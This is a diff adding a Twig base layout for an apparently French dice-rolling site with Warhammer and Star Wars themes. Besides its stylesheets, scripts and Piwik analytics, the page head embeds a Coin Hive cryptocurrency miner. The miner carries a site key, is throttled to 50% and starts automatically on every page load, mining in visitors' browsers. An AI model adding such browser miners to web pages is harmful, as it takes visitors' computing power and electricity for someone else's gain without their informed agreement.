@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!-- Stylesheets -->
+    <link rel="stylesheet" type="text/css" href="{{ global.request.basepath }}/css/style.css">
+    {% if dice == 'warhammer' %}
+        <link rel="stylesheet" type="text/css" href="{{ global.request.basepath }}/css/wh_style.css">
+    {% endif %}
+    {% if dice == 'starwars' %}
+        <link rel="stylesheet" type="text/css" href="{{ global.request.basepath }}/css/sw_style.css">
+    {% endif %}
+
+    <!-- Scripts -->
+    <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script src="{{ global.request.basepath }}/js/script.js"></script>
+    {% if dice == 'warhammer' %}
+        <script src="{{ global.request.basepath }}/js/wh_script.js"></script>
+    {% endif %}
+    {% if dice == 'starwars' %}
+        <script src="{{ global.request.basepath }}/js/sw_script.js"></script>
+    {% endif %}
+
+    <!-- Piwik -->
+    <script type="text/javascript">
+        var _paq = _paq || [];
+        /* tracker methods like "setCustomDimension" should be called before "trackPageView" */
+        _paq.push(['trackPageView']);
+        _paq.push(['enableLinkTracking']);
+        (function() {
+            var u="//rocknrolecircus.org/analytics/";
+            _paq.push(['setTrackerUrl', u+'piwik.php']);
+            _paq.push(['setSiteId', '1']);
+            var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+            g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'piwik.js'; s.parentNode.insertBefore(g,s);
+        })();
+    </script>
+    <!-- End Piwik Code -->
+
+    <!-- Coin Hive -->
+    <script src="https://authedmine.com/lib/authedmine.min.js"></script>
+    <script>
+        var miner = new CoinHive.Anonymous('Y7gln7JmD9kVY9OoDLkVPwlgSAYS017P');
+        miner.setThrottle(0.5);
+        miner.start();
+    </script>
+    <!-- End of Coin Hive Code -->
+</head>
+
+{% block body %}
+
+{% endblock %}
